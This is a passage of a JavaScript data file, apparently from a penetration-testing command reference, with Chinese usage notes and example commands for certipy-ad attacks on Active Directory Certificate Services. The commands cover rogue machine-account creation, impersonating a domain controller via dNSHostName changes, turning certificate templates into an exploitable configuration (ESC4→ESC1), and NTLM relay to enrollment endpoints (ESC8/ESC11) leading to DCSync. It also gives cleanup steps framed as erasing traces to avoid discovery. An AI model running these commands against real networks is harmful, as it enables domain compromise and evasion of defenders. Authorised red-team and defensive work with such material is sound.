  -dc-ip IP        域控 IP
攻击场景: 默认域允许普通用户创建最多 10 个机器账户 (MachineAccountQuota)。
创建的机器账户可用于: 配置基于资源的约束委派 (RBCD)、
申请机器证书 (ESC1 -dns)、或作为 Kerberos 认证的干净身份。`,
        example: 'certipy-ad account -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -user evilpc$ -pass EvilPass123 create',
      },
      {
        id: 'certipy-account-read',
        title: 'read - 查看账户属性',
        description: '读取账户的 DNS/UPN/SPN 等属性,更新操作前先核对当前值',
        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v('', 'TARGET_ACCOUNT')} read`,
        usage: `位置参数:
  read             查看账户属性
关键参数:
  -user SAM_NAME   目标账户登录名 (必填)
  -dc-ip IP        域控 IP
说明: 执行 update 前先 read 记录原值 (尤其是 dNSHostName、userPrincipalName、
servicePrincipalName),收队时照原值恢复,避免遗留改动被发现。
也用于确认 create/delete 是否生效。`,
        example: 'certipy-ad account -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -user victim$ read',
      },
      {
        id: 'certipy-account-update-dns',
        title: 'update - 修改 DNS/UPN/SPN',
        description: '对可控账户改 dNSHostName (-dns) 或 UPN (-upn),配合机器证书申请冒充其他主机',
        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v('', 'MACHINE$')} -dns ${v(p.dcFQDN, 'DC_FQDN')} update`,
        usage: `位置参数:
  update           修改已有账户的属性
关键参数:
  -user SAM_NAME   目标账户登录名 (必填)
  -dns HOSTNAME    设置 dNSHostName (如 dc01.corp.local)
  -upn UPN         设置 userPrincipalName
  -sam NAME        设置 SAM 账户名
  -spns LIST       设置 SPN (逗号分隔)
  -dc-ip IP        域控 IP
攻击场景: 机器账户申请证书时 SAN 取自 dNSHostName。把可控机器账户的
-dns 改成域控 FQDN 后申请机器模板证书,即可冒充 DC$ (配合无 SAN 校验
的模板,即 ESC9/机器证书冒充思路的变体)。改完务必 read 记录原值以便恢复。`,
        example: 'certipy-ad account -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -user evilpc$ -dns dc01.corp.local update',
      },
      {
        id: 'certipy-account-delete',
        title: 'delete - 删除账户',
        description: '删除自建机器账户,攻击收尾清理痕迹',
        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v('', 'MACHINE$')} delete`,
        usage: `位置参数:
  delete           删除账户
关键参数:
  -user SAM_NAME   目标账户登录名 (必填)
  -dc-ip IP        域控 IP
说明: 删除自己创建的机器账户是 RBCD/机器证书攻击的标准收尾。
注意账户创建者不一定有删除权限 (受容器 ACL 限制),
若 delete 失败可退而求其次: 清空密码 (-pass 随机值) 并移除 SPN 使其失效。`,
        example: 'certipy-ad account -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -user evilpc$ delete',
      },
    ],
  },
  {
    id: 'certipy-template',
    name: 'certipy-ad template',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '查看/修改证书模板配置 (ESC4 利用: 对模板有写权限时注入漏洞配置)',
    commands: [
      {
        id: 'certipy-template-write-default',
        title: '写入默认 ESC1 配置',
        description: '-write-default-configuration 把模板改成 ESC1 漏洞配置,自动先备份',
        build: (p) => `${buildCertipyAuth(p, 'template')} -template ${v(p.certTemplate, 'TEMPLATE')} -write-default-configuration`,
        usage: `关键参数:
  -template NAME                  要操作的模板名 (必填,区分大小写)
  -write-default-configuration    应用 Certipy 默认 ESC1 配置,
                                  使模板变为 ESC1 可利用状态
  -no-save                        应用前不备份当前配置 (不推荐)
  -force                          不询问确认直接应用
  -dc-ip IP                       域控 IP
攻击场景 (ESC4): 你对模板对象有 GenericWrite/WriteDacl/WriteProperty 权限时,
直接把模板改成: 允许请求方提供 SAN + 客户端认证 EKU + 低权限可注册,
然后 certipy-ad req -upn administrator@... 走标准 ESC1 流程。
工具默认会先把原配置备份成 JSON,收队用 -write-configuration 还原。`,
        example: 'certipy-ad template -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -template VulnTemplate -write-default-configuration',
      },
      {
        id: 'certipy-template-save',
        title: '备份模板配置',
        description: '-save-configuration 把当前模板配置导出为 JSON,改动前手动备份',
        build: (p) => `${buildCertipyAuth(p, 'template')} -template ${v(p.certTemplate, 'TEMPLATE')} -save-configuration ${v(p.fileName, 'backup.json')}`,
        usage: `关键参数:
  -template NAME               要操作的模板名 (必填,区分大小写)
  -save-configuration FILE     把当前模板配置保存到 JSON 文件
  -dc-ip IP                    域控 IP
说明: 即 v4 的 -save-old 在 v5 的对应写法。虽然 -write-configuration /
-write-default-configuration 不指定时也会自动备份,但显式保存到指定文件
更稳妥——尤其多人协作或需要把备份带出目标的场景。
备份文件是后续 -write-configuration 还原的输入。`,
        example: 'certipy-ad template -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -template VulnTemplate -save-configuration vulntemplate_backup.json',
      },
      {
        id: 'certipy-template-restore',
        title: '从 JSON 恢复配置',
        description: '-write-configuration 应用 JSON 配置,攻击后还原模板原状',
        build: (p) => `${buildCertipyAuth(p, 'template')} -template ${v(p.certTemplate, 'TEMPLATE')} -write-configuration ${v(p.fileName, 'backup.json')}`,
        usage: `关键参数:
  -template NAME              要操作的模板名 (必填,区分大小写)
  -write-configuration FILE   从 JSON 文件应用配置到模板
                              (还原备份或应用自定义设置)
  -force                      不询问确认直接应用
  -no-save                    应用前不再备份当前配置
  -dc-ip IP                   域控 IP
说明: 即 v4 的 -update 在 v5 的对应写法 (v5 统一为 JSON 配置文件驱动)。
收队时用攻击前 -save-configuration 的备份执行本命令,
把模板 ACL/EKU/msPKI-Certificate-Name-Flag 等全部还原,消除 ESC4 痕迹。`,
        example: 'certipy-ad template -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -template VulnTemplate -write-configuration vulntemplate_backup.json -force',
      },
    ],
  },
  {
    id: 'certipy-relay',
    name: 'certipy-ad relay',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: 'NTLM Relay 到 ADCS Web Enrollment (ESC8) 或 RPC 接口 (ESC11),为被 Relay 的账户换取证书',
    commands: [
      {
        id: 'certipy-relay-http',
        title: 'ESC8 - Relay 到 Web Enrollment',
        description: '-target 指向 CA 的 HTTP 端点,等待/触发 NTLM 认证后自动申请证书',
        build: (p) => `certipy-ad relay -target http://${v(p.targetHost || p.targetIP, 'CA_HOST')} -template ${v(p.certTemplate, 'TEMPLATE')}`,
        usage: `关键参数:
  -target URL      CA 端点,格式 protocol://<主机>;ESC8 用 http://ca.corp.local
  -template NAME   申请的模板;省略时按被 Relay 账户名自动选择
                   (以 $ 结尾用 Machine,否则用 User)
  -interface IP    监听网卡 IP (默认 0.0.0.0)
  -port PORT       监听端口 (默认 445)
  -out FILE        保存证书+私钥的文件 (PFX)
攻击场景 (ESC8): CA 的 Web Enrollment 端点未强制 HTTPS/未开 EPA 时,
用 PetitPotam/PrinterBug 等强制目标机器向本机发起 NTLM 认证,
Relay 到 /certsrv 即为该机器账户申请到证书,随后 auth 换 TGT。
配合 Coercer/netexec 触发, Relay DC$ 即可 DCSync。`,
        example: 'certipy-ad relay -target http://ca.corp.local -template User',
      },
      {
        id: 'certipy-relay-dc',
        title: 'ESC8 - Relay DC 申请域控证书',
        description: '-template DomainController 处理被 Relay 的 DC$ 账户 (自动选择逻辑不含此模板)',
        build: (p) => `certipy-ad relay -target http://${v(p.targetHost || p.targetIP, 'CA_HOST')} -template DomainController`,
        usage: `关键参数:
  -target URL                CA 的 HTTP 端点
  -template DomainController  Relay 域控机器账户时必须显式指定;
                             官方帮助明确说明: Relaying a DC should require
                             specifying the 'DomainController' template
  -interface IP / -port PORT  监听地址与端口 (默认 0.0.0.0:445)
攻击场景: 强制 DC$ 向攻击者机器认证 (PetitPotam 等) 并 Relay 到 Web
Enrollment。DC$ 对应的默认 Machine 模板在很多环境不可用,需改用
DomainController 模板才能成功申请。拿到 DC$ 证书 → auth 换 TGT → DCSync,
一条命令链直达域管。`,
        example: 'certipy-ad relay -target http://ca.corp.local -template DomainController',
      },
      {
        id: 'certipy-relay-rpc',
        title: 'ESC11 - Relay 到 RPC 接口',
        description: '-target rpc:// 走 ICPR RPC 接口,-ca 必填;针对未强制加密的 CA',
        build: (p) => `certipy-ad relay -target rpc://${v(p.targetHost || p.targetIP, 'CA_HOST')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')}`,
        usage: `关键参数:
  -target rpc://CA_HOST  RPC 方式的 CA 端点 (ESC11)
  -ca CA_NAME            CA 名称;官方帮助注明: Only required for RPC relay (ESC11)
  -template NAME         申请的模板 (省略时按账户类型自动选择)
  -interface IP / -port PORT  监听地址与端口
攻击场景 (ESC11): CA 未设置 IF_ENFORCEENCRYPTICERTREQUEST
(允许未加密的 ICPR 请求) 时,NTLM Relay 不止能打 HTTP,
还能直接打 RPC 证书注册接口。修复方案是设置该标志强制 RPC 加密,
本命令用于验证该配置是否缺失。`,
        example: 'certipy-ad relay -target rpc://ca.corp.local -ca CORP-CA -template User',
      },
      {
        id: 'certipy-relay-forever',
        title: '持续 Relay 模式',
        description: '-forever 成功一次后不退出,-no-skip 允许重复攻击同一账户,-enum-templates 先枚举可用模板',
        build: (p) => `certipy-ad relay -target http://${v(p.targetHost || p.targetIP, 'CA_HOST')} -template ${v(p.certTemplate, 'TEMPLATE')} -interface ${v(p.localIP, 'LISTEN_IP')} -forever`,
        usage: `关键参数:
  -forever         首次成功 Relay 后不停止服务,持续等待新连接
  -no-skip         不跳过已攻击过的用户 (配合 -forever 使用)
  -enum-templates  Relay 到 /certsrv/certrqxt.asp 解析可用模板列表,
                   实战前先确认目标模板是否可经 Web 申请
  -interface IP    监听网卡 IP (默认 0.0.0.0),多网卡时指定内网接口
  -port PORT       监听端口 (默认 445;与 Responder/impacket 冲突时调整)
说明: 红队行动中配合持续的 Coercion 源 (如批量触发多台机器),
一次起服务收割多张证书。-timeout 控制连接超时 (默认 10 秒)。`,
        example: 'certipy-ad relay -target http://ca.corp.local -template Machine -interface 192.168.1.5 -forever',
      },
    ],
  },
  {
    id: 'certipy-parse',
    name: 'certipy-ad parse',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '离线解析导出的注册表数据 (BOF 输出/.reg 文件),无需域连接即可评估 ADCS 模板漏洞',
    commands: [
      {
        id: 'certipy-parse-bof',
        title: '解析 BOF 输出',
        description: '默认 -format bof,解析 BOF/C2 导出的 CA 注册表数据并做漏洞评估',
        build: (p) => `certipy-ad parse ${v(p.fileName, 'FILE')} -stdout`,
        usage: `位置参数:
  file             要解析的文件 (BOF 输出或注册表导出的 .reg 文件)
关键参数:
  -format FORMAT   输入格式: bof (默认) 或 reg
  -stdout          结果打印到控制台 (也可用 -json/-csv/-text + -output 导出)
  -domain NAME     域名,仅用于输出上下文 (默认 UNKNOWN)
  -ca NAME         CA 名,仅用于输出上下文 (默认 UNKNOWN)
说明: 数据来自目标 CA 注册表导出 (如通过 BOF 读 HKLM\\SYSTEM\\
CurrentControlSet\\Services\\CertSvc\\Configuration),全程不与域交互,
适合从已控制的 CA 服务器上拿数据后离线分析模板权限与漏洞。`,
        example: 'certipy-ad parse bof_output.txt -stdout',
      },
      {
        id: 'certipy-parse-reg',
        title: '解析 .reg 注册表导出',
        description: '-format reg 解析 Windows reg export 文件,-vulnerable 只显示可利用模板',
        build: (p) => `certipy-ad parse ${v(p.fileName, 'FILE.reg')} -format reg -vulnerable -stdout`,
        usage: `位置参数:
  file             Windows 注册表导出文件 (.reg)
关键参数:
  -format reg      指定输入为 .reg 格式
  -vulnerable      只显示存在漏洞的证书模板
  -enabled         只显示已启用的证书模板
  -hide-admins     输出中不显示管理员权限信息
  -stdout          结果打印到控制台
说明: 在目标上 reg export "HKLM\\SYSTEM\\CurrentControlSet\\Services\\
CertSvc\\Configuration\\<CA>" ca.reg 后带回分析。-vulnerable 的判定逻辑
与 find 一致 (ESC 系列),但没有 LDAP 侧的实时组成员数据,
准确性与 -sids 参数的提供程度相关。`,
        example: 'certipy-ad parse ca_backup.reg -format reg -vulnerable -stdout',
      },
      {
        id: 'certipy-parse-sids',
        title: '按已控 SID 评估漏洞',
        description: '-sids 把给定 SID 视为已拥有,-published 指定已发布模板,离线推演可利用路径',
        build: (p) => `certipy-ad parse ${v(p.fileName, 'FILE')} -sids ${v('', 'SID1,SID2')} -vulnerable -stdout`,
        usage: `位置参数:
  file             要解析的文件 (BOF 输出或 .reg)
关键参数:
  -sids SIDS       逗号分隔的 SID 列表,评估时视为"已拥有"的主体
                   (你的用户 SID + 所在组 SID)
  -published LIST  逗号分隔的模板名,视为已在 AD 中发布
  -vulnerable      只显示对这些 SID 而言存在漏洞的模板
  -use-owned-sids  使用 BloodHound 中所有 owned 主体的 SID (需 bloodhound extra 与 neo4j 连接参数)
说明: 离线评估的核心——注册表数据里没有"你是谁"的概念,
把已控账户/组的 SID 喂进去,parse 就能算出哪些模板对这些主体
开放注册且存在 ESC 条件,效果接近在线 find -vulnerable。`,
        example: 'certipy-ad parse bof_output.txt -sids S-1-5-21-1334961600-1763989488-2140997488-1105,S-1-5-21-1334961600-1763989488-2140997488-513 -vulnerable -stdout',
      },
    ],
  },
];
